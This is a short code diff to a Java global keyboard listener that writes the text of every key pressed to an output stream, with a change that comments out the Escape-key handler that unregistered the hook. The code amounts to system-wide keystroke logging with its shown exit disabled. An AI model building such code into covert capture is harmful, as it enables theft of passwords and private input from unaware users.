@@ -25,6 +25,7 @@ public class GlobalKeyListener implements NativeKeyListener {
     public void nativeKeyPressed(NativeKeyEvent keyEvent) {
         //System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(keyEvent.getKeyCode()));
 
+        /*
         if (keyEvent.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
             try {
                 GlobalScreen.unregisterNativeHook();
@@ -32,6 +33,7 @@ public class GlobalKeyListener implements NativeKeyListener {
                 e1.printStackTrace();
             }
         }
+        */
         String keyString = NativeKeyEvent.getKeyText(keyEvent.getKeyCode());
         try {
             outputStream.write(keyString.getBytes());
